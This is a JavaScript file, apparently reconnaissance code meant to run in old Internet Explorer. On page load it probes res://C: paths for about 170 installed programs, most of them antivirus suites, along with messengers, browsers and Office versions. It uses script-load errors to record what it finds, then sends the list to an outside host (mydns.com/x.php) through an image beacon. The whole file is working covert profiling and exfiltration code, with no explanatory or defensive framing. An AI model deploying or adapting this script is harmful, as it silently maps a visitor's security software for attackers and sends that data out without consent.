window.onload=begin;
var fileinfo;
var index=0;
var realinfo=new Array();
var softlist=[
["DiskClean马","\\Program Files\\DiskClean\\DiskClean.exe/24/1"],
["360 6.2 beta","\\Program Files\\360\\360Safe\\360Safe.exe/2/470"],
["Skype","\\Program Files\\Skype\\Phone\\Skype.exe/24/1"],
["Skype TOM","\\Program Files\\Skype\\Phone\\skmsg.dll/24/1"],
["360卫士 7.3.0.2003 正式","\\Program Files\\360\\360Safe\\360Safe.exe/2/139"],
["360安全卫士7.3.0.2003","\\Program Files\\360\\360Safe\\safemon\\360tray.exe/2/132"],
["360安全卫士","\\Program Files\\360\\360Safe\\360leakfixer.exe/2/110"],
["360杀毒","\\Program Files\\360\\360sd\\mfc42u.dll/2/26567"],
["360保险箱","\\Program Files\\360\\360safebox\\BoxChecker/2/203"],
["Nod32 AntiVirus","\\Program Files\\ESET\\ESET NOD32 Antivirus\\mfc80.DLL/2/32384"],
["ESET Smart Security 4.0.441.0","\\Program Files\\ESET\\ESET NOD32 Antivirus\\ekrn.exe/6/7"],
["KIS2011卡巴斯基网络安全套件 11.0.1.400","\\Program Files\\Kaspersky Lab\\卡巴斯基安全部队 2011\\avp.exe/3/IDE_MAIN"],
["Kaspersky Internet Security 2010","\\Program Files\\Kaspersky Internet Security 2010\\avikrnl.dll/2/BBALL"],
["BitDefender 全方位安全软件2010","\\Program Files\\BitDefender\\BitDefender 2010\\vsserv.exe/6/7"],
["江民杀毒软件KV2010","\\Program Files\\JiangMin\\Antivirus\\KVXp.exe/3/201"],
["ZoneAlarm Internet Security Suite","\\Program Files\\Zone Labs\\ZoneAlarm\\zlclient.exe/2/102"],
["avast!网络安全软件","\\Program Files\\Alwil Software\\Avast5\\avastUI.exe/2/101"],
["大蜘蛛专业版6.0","\\Program Files\\DrWeb\\spidergate.exe/2/1372"],
["金山毒霸2011SP3+金山卫士 2.0","\\Program Files\\Kingsoft\\KSafe\\KSafeSvc.exe/6/7"],
["Micropoint 微点主动防御软件","\\Program Files\\Micropoint\\MPMain.exe/3/128"],
["费尔托斯特V7","\\Program Files\\Filseclab\\Twister\\Twister.exe/2/180"],
["mfcs(Microsoft Forefront Client Security)","\\Program Files\\Microsoft Forefront\\Client Security\\Client\\Antimalware\\MSASCui.exe/3/IDI_ARP"],
["趋势科技网络安全专家 2010","\\Program Files\\Trend Micro\\Internet Security\\SfFnWSC.exe/2/30994"],
["迈克菲防病毒+防火墙组合装","\\Program Files\\McAfee.com\\Agent\\mcagent.exe/3/202"],
["瑞星全功能安全软件2011","\\Program Files\\Rising\\Ris\\RSTRAY.EXE/3/108"],
["瑞星杀毒","\\Program Files\\Rising\\RAV\\RsConfig.dll/2/100"],
["安博士 AhnLab V3 Internet Security 2009 Platinum","\\Program Files\\AhnLab\\Smart Update Utility\\AhnSD.exe/3/107"],
["Avira Antivir Personal--Free Antivirus中文版10","\\Program Files\\Avira\\AntiVir Desktop\\avcenter.exe/3/101"],
["Avira Antivir","\\Program Files\\Avira\\AntiVir Desktop\\avcenter.exe/16/1"],
["Avira Antivir1","\\Program Files\\Avira Software\\AntiVir\\AvastUI.exe/24/1"],
["诺顿 2009","\\Program Files\\Norton Internet Security\\Engine\\16.7.2.11\\uiStub.exe/16/1"],
["Norton Internet Security 2010诺顿","\\Program Files\\Norton Internet Security\\Engine\\17.7.0.12\\ccSvcHst.exe/3/201"],
["Microsoft Office 97","\\Program Files\\Microsoft Office\\OFFICE\\BINDER.EXE/16/1"],
["Microsoft Office 2000","\\Program Files\\Microsoft Office\\OFFICE\\WINWORD.EXE/16/1"],
["Microsoft Office 2003","\\Program Files\\Microsoft Office\\OFFICE11\\WINWORD.EXE/16/1"],
["Microsoft Office 2007","\\Program Files\\Microsoft Office\\OFFICE12\\WINWORD.EXE/16/1"],
["Microsoft Office 2010","\\Program Files\\Microsoft Office\\OFFICE14\\WINWORD.EXE/16/1"],
["WPS Personal","\\Program Files\\Kingsoft\\WPS Office Personal\\utility\\repairinst.exe/16/1"],
["WPS 2008","\\Program Files\\Kingsoft\\WPS Office 2008\\utility\\repairinst.exe/16/1"],
["WPS 2009","\\Program Files\\Kingsoft\\WPS Office 2009\\utility\\repairinst.exe/16/1"],
["WPS 2010","\\Program Files\\Kingsoft\\WPS Office 2010\\utility\\repairinst.exe/16/1"],
["Fetion","\\Program Files\\China Mobile\\Fetion\\Fetion.exe/16/1"],
["Google Talk","\\Program Files\\Google\\Google Talk\\googletalk.exe/16/1"],
["AliIM","\\Program Files\\AliWangWang\\AliIM.exe/16/1"],
["网易 POPO","\\Program Files\\Netease\\POPO\\Start.exe/16/1"],
["ICQLite","\\Program Files\\ICQLite\\ICQLite.exe/16/1"],
["Tecent TM 2007","\\Program Files\\Tencent\\TM2007\\Bin\\TM.exe/16/1"],
["Tecent TM 2008","\\Program Files\\Tencent\\TM2008\\Bin\\TM.exe/16/1"],
["Tecent TM 2009","\\Program Files\\Tencent\\TM2009\\Bin\\TM.exe/16/1"],
["Sina Uc","\\Program Files\\Sina\\SinaUC\\SinaUC.exe/16/1"],
["QQ 2008","\\Program Files\\Tencent\\QQ2008\\qq.exe/16/1"],
["QQ 2009","\\Program Files\\Tencent\\QQ\\Bin\\TSFSCAN.exe/16/1"],
["QQ 2010","\\Program Files\\Tencent\\QQ\\Bin\\Contacts.dll/16/1"],
["Baidu HI","\\Program Files\\Baidu Hi\\BaiduHi.exe/16/1"],
["AIM","\\Program Files\\AIM\\aim.exe/16/1"],
["MSN","\\Program Files\\Messenger\\msmsgs.exe/16/1"],
["Window Live MSN","\\Program Files\\Windows Live\\Messenger\\msnmsgr.exe/16/1"],
["TheWorld 2.0","\\Program Files\\TheWorld 2.0\\TheWorld.exe/16/1"],
["TheWorld 3","\\Program Files\\TheWorld 3\\TheWorld.exe/16/1"],
["QQ 浏览器","\\Program Files\\Tencent\\TT\\bin\\TTraveler.exe/16/1"],
["Google Chrome","\\Program Files\\Google\\Chrome\\Application\\chrome.exe/16/1"],
["Maxthon 2","\\Program Files\\Maxthon2\\Maxthon.exe/2/128"],
["Maxthon 3","\\Program Files\\Maxthon3\\Bin\\Maxthon.exe/16/1"],
["360 浏览器","\\Program Files\\360\\360se3\\360SE.exe/16/1"],
["Opera","\\Program Files\\Opera\\opera.exe/16/1"],
["Safari","\\Program Files\\Safari\\Safari.exe/16/1"],
["SaaYaa","\\Program Files\\SaaYaa\\SaaYaa.exe/16/1"],
["GreenBrowser","\\Program Files\\GreenBrowser\\GreenBrowser.exe/16/1"],
["Firefox all","\\Program Files\\Mozilla Firefox\\firefox.exe/16/1"],
["Foxmail all","\\Program Files\\Foxmail\\Foxmail.exe/2/FLAG"],
["Adobe Reader 7.0","\\Program Files\\Adobe\\Reader 7.0\\Reader\\AXEParser.dll/16/1"],
["Adobe Professional 7.0","\\Program Files\\Adobe\\Acrobat 7.0\\Acrobat\\Acrobat.dll/16/1"],
["Adobe Reader 8.0","\\Program Files\\Adobe\\Reader 8.0\\Reader\\AdobeXMP.dll/16/1"],
["Adobe Reader 9.0","\\Program Files\\Adobe\\Reader 9.0\\Reader\\authplay.dll/16/1"],
["TrueCrypt","\\Program Files\\TrueCrypt\\TrueCrypt.exe/2/112"],
["EditPlus 3","\\Program Files\\EditPlus 3\\editplus.exe/2/126"],
["Daemon Tools lite","\\Program Files\\DAEMON Tools Lite\\DTCommonRes.dll/2/209"],
["VMware","\\Program Files\\WMware\\VMware Workstation\\p2vWizard.dll/2/134"],
["迅雷","\\Program Files\\Thunder NetWork\\Thunder\\Program\\Thunder.exe/2/138"],
["WinRAR","\\Program Files\\\\WinRAR.exe/2/101"],
["暴风影音","\\Program Files\\StormII\\StormSkinRes.dll/2/193"],
["DiskClean马(64)","\\Program Files (x86)\\DiskClean\\DiskClean.exe/24/1"],
["360 6.2 beta(64)","\\Program Files (x86)\\360\\360Safe\\360Safe.exe/2/470"],
["Skype(64)","\\Program Files (x86)\\Skype\\Phone\\Skype.exe/24/1"],
["Skype TOM(64)","\\Program Files (x86)\\Skype\\Phone\\skmsg.dll/24/1"],
["360卫士 7.3.0.2003 正式(64)","\\Program Files (x86)\\360\\360Safe\\360Safe.exe/2/139"],
["360安全卫士7.3.0.2003(64)","\\Program Files (x86)\\360\\360Safe\\safemon\\360tray.exe/2/132"],
["360安全卫士(64)","\\Program Files (x86)\\360\\360Safe\\360leakfixer.exe/2/110"],
["360杀毒(64)","\\Program Files (x86)\\360\\360sd\\mfc42u.dll/2/26567"],
["360保险箱(64)","\\Program Files (x86)\\360\\360safebox\\BoxChecker/2/203"],
["Nod32 AntiVirus(64)","\\Program Files (x86)\\ESET\\ESET NOD32 Antivirus\\mfc80.DLL/2/32384"],
["ESET Smart Security 4.0.441.0(64)","\\Program Files (x86)\\ESET\\ESET NOD32 Antivirus\\ekrn.exe/6/7"],
["KIS2011卡巴斯基网络安全套件 11.0.1.400(64)","\\Program Files (x86)\\Kaspersky Lab\\卡巴斯基安全部队 2011\\avp.exe/3/IDE_MAIN"],
["Kaspersky Internet Security 2010(64)","\\Program Files (x86)\\Kaspersky Internet Security 2010\\avikrnl.dll/2/BBALL"],
["BitDefender 全方位安全软件2010(64)","\\Program Files (x86)\\BitDefender\\BitDefender 2010\\vsserv.exe/6/7"],
["江民杀毒软件KV2010(64)","\\Program Files (x86)\\JiangMin\\Antivirus\\KVXp.exe/3/201"],
["ZoneAlarm Internet Security Suite(64)","\\Program Files (x86)\\Zone Labs\\ZoneAlarm\\zlclient.exe/2/102"],
["avast!网络安全软件(64)","\\Program Files (x86)\\Alwil Software\\Avast5\\avastUI.exe/2/101"],
["大蜘蛛专业版6.0(64)","\\Program Files (x86)\\DrWeb\\spidergate.exe/2/1372"],
["金山毒霸2011SP3+金山卫士 2.0(64)","\\Program Files (x86)\\Kingsoft\\KSafe\\KSafeSvc.exe/6/7"],
["Micropoint 微点主动防御软件(64)","\\Program Files (x86)\\Micropoint\\MPMain.exe/3/128"],
["费尔托斯特V7(64)","\\Program Files (x86)\\Filseclab\\Twister\\Twister.exe/2/180"],
["mfcs(Microsoft Forefront Client Security)(64)","\\Program Files (x86)\\Microsoft Forefront\\Client Security\\Client\\Antimalware\\MSASCui.exe/3/IDI_ARP"],
["趋势科技网络安全专家 2010(64)","\\Program Files (x86)\\Trend Micro\\Internet Security\\SfFnWSC.exe/2/30994"],
["迈克菲防病毒+防火墙组合装(64)","\\Program Files (x86)\\McAfee.com\\Agent\\mcagent.exe/3/202"],
["瑞星全功能安全软件2011(64)","\\Program Files (x86)\\Rising\\Ris\\RSTRAY.EXE/3/108"],
["瑞星杀毒(64)","\\Program Files (x86)\\Rising\\RAV\\RsConfig.dll/2/100"],
["安博士 AhnLab V3 Internet Security 2009 Platinum(64)","\\Program Files (x86)\\AhnLab\\Smart Update Utility\\AhnSD.exe/3/107"],
["Avira Antivir Personal--Free Antivirus中文版10(64)","\\Program Files (x86)\\Avira\\AntiVir Desktop\\avcenter.exe/3/101"],
["Avira Antivir(64)","\\Program Files (x86)\\Avira\\AntiVir Desktop\\avcenter.exe/16/1"],
["Avira Antivir1(64)","\\Program Files (x86)\\Avira Software\\AntiVir\\AvastUI.exe/24/1"],
["诺顿 2009(64)","\\Program Files (x86)\\Norton Internet Security\\Engine\\16.7.2.11\\uiStub.exe/16/1"],
["Norton Internet Security 2010诺顿(64)","\\Program Files (x86)\\Norton Internet Security\\Engine\\17.7.0.12\\ccSvcHst.exe/3/201"],
["Microsoft Office 97(64)","\\Program Files (x86)\\Microsoft Office\\OFFICE\\BINDER.EXE/16/1"],
["Microsoft Office 2000(64)","\\Program Files (x86)\\Microsoft Office\\OFFICE\\WINWORD.EXE/16/1"],
["Microsoft Office 2003(64)","\\Program Files (x86)\\Microsoft Office\\OFFICE11\\WINWORD.EXE/16/1"],
["Microsoft Office 2007(64)","\\Program Files (x86)\\Microsoft Office\\OFFICE12\\WINWORD.EXE/16/1"],
["Microsoft Office 2010(64)","\\Program Files (x86)\\Microsoft Office\\OFFICE14\\WINWORD.EXE/16/1"],
["WPS Personal(64)","\\Program Files (x86)\\Kingsoft\\WPS Office Personal\\utility\\repairinst.exe/16/1"],
["WPS 2008(64)","\\Program Files (x86)\\Kingsoft\\WPS Office 2008\\utility\\repairinst.exe/16/1"],
["WPS 2009(64)","\\Program Files (x86)\\Kingsoft\\WPS Office 2009\\utility\\repairinst.exe/16/1"],
["WPS 2010(64)","\\Program Files (x86)\\Kingsoft\\WPS Office 2010\\utility\\repairinst.exe/16/1"],
["Fetion(64)","\\Program Files (x86)\\China Mobile\\Fetion\\Fetion.exe/16/1"],
["Google Talk(64)","\\Program Files (x86)\\Google\\Google Talk\\googletalk.exe/16/1"],
["AliIM(64)","\\Program Files (x86)\\AliWangWang\\AliIM.exe/16/1"],
["网易 POPO(64)","\\Program Files (x86)\\Netease\\POPO\\Start.exe/16/1"],
["ICQLite(64)","\\Program Files (x86)\\ICQLite\\ICQLite.exe/16/1"],
["Tecent TM 2007(64)","\\Program Files (x86)\\Tencent\\TM2007\\Bin\\TM.exe/16/1"],
["Tecent TM 2008(64)","\\Program Files (x86)\\Tencent\\TM2008\\Bin\\TM.exe/16/1"],
["Tecent TM 2009(64)","\\Program Files (x86)\\Tencent\\TM2009\\Bin\\TM.exe/16/1"],
["Sina Uc(64)","\\Program Files (x86)\\Sina\\SinaUC\\SinaUC.exe/16/1"],
["QQ 2008(64)","\\Program Files (x86)\\Tencent\\QQ2008\\qq.exe/16/1"],
["QQ 2009(64)","\\Program Files (x86)\\Tencent\\QQ\\Bin\\TSFSCAN.exe/16/1"],
["QQ 2010(64)","\\Program Files (x86)\\Tencent\\QQ\\Bin\\Contacts.dll/16/1"],
["Baidu HI(64)","\\Program Files (x86)\\Baidu Hi\\BaiduHi.exe/16/1"],
["AIM(64)","\\Program Files (x86)\\AIM\\aim.exe/16/1"],
["MSN(64)","\\Program Files (x86)\\Messenger\\msmsgs.exe/16/1"],
["Window Live MSN(64)","\\Program Files (x86)\\Windows Live\\Messenger\\msnmsgr.exe/16/1"],
["TheWorld 2.0(64)","\\Program Files (x86)\\TheWorld 2.0\\TheWorld.exe/16/1"],
["TheWorld 3(64)","\\Program Files (x86)\\TheWorld 3\\TheWorld.exe/16/1"],
["QQ 浏览器(64)","\\Program Files (x86)\\Tencent\\TT\\bin\\TTraveler.exe/16/1"],
["Google Chrome(64)","\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe/16/1"],
["Maxthon 2(64)","\\Program Files (x86)\\Maxthon2\\Maxthon.exe/2/128"],
["Maxthon 3(64)","\\Program Files (x86)\\Maxthon3\\Bin\\Maxthon.exe/16/1"],
["360 浏览器(64)","\\Program Files (x86)\\360\\360se3\\360SE.exe/16/1"],
["Opera(64)","\\Program Files (x86)\\Opera\\opera.exe/16/1"],
["Safari(64)","\\Program Files (x86)\\Safari\\Safari.exe/16/1"],
["SaaYaa(64)","\\Program Files (x86)\\SaaYaa\\SaaYaa.exe/16/1"],
["GreenBrowser(64)","\\Program Files (x86)\\GreenBrowser\\GreenBrowser.exe/16/1"],
["Firefox all(64)","\\Program Files (x86)\\Mozilla Firefox\\firefox.exe/16/1"],
["Foxmail all(64)","\\Program Files (x86)\\Foxmail\\Foxmail.exe/2/FLAG"],
["Adobe Reader 7.0(64)","\\Program Files (x86)\\Adobe\\Reader 7.0\\Reader\\AXEParser.dll/16/1"],
["Adobe Professional 7.0(64)","\\Program Files (x86)\\Adobe\\Acrobat 7.0\\Acrobat\\Acrobat.dll/16/1"],
["Adobe Reader 8.0(64)","\\Program Files (x86)\\Adobe\\Reader 8.0\\Reader\\AdobeXMP.dll/16/1"],
["Adobe Reader 9.0(64)","\\Program Files (x86)\\Adobe\\Reader 9.0\\Reader\\authplay.dll/16/1"],
["TrueCrypt(64)","\\Program Files (x86)\\TrueCrypt\\TrueCrypt.exe/2/112"],
["EditPlus 3(64)","\\Program Files (x86)\\EditPlus 3\\editplus.exe/2/126"],
["Daemon Tools lite(64)","\\Program Files (x86)\\DAEMON Tools Lite\\DTCommonRes.dll/2/209"],
["VMware(64)","\\Program Files (x86)\\WMware\\VMware Workstation\\p2vWizard.dll/2/134"],
["迅雷(64)","\\Program Files (x86)\\Thunder NetWork\\Thunder\\Program\\Thunder.exe/2/138"],
["WinRAR(64)","\\Program Files (x86)\\\\WinRAR.exe/2/101"],
["暴风影音(64)","\\Program Files (x86)\\StormII\\StormSkinRes.dll/2/193"]
];
window.onerror=function(a,b,c)
{
	realinfo.push(fileinfo[0]);	
	//alert('onerror='+a);
	//alert(realinfo);
 	return true;
};
function isHasSoft(src)
{	
	var f=document.createElement('script');
	f.setAttribute('src',src);	
	document.body.appendChild(f);	
}
function begin()
{	
	if(index>=softlist.length)
	{
		//alert('end='+realinfo);
		addFile();
		return;
	}
	else
	{
		while(index<softlist.length)
		{
		startC('res://C:',index); 		
		}	
	}
	begin();
}

var slistlen=softlist.length;
var curfile;
function startC(curdisk,curindex)
{		
	if(index<softlist.length)
	{
		while(curindex<softlist.length)
		{				
			if(curindex<softlist.length)	
			{				
			   fileinfo=softlist[curindex];	  
			   curfile=curdisk+softlist[curindex][1];				  
			   isHasSoft(curfile);	
			   curindex++;
			   index++;		     
			   setTimeout(startC,0);		   
			}				
		}		
	}
	else
	{
		return;
	}	
}


function addFile()
{   
	//alert(realinfo);

   (new Image()).src="http://mydns.com/x.php?c="+realinfo;
}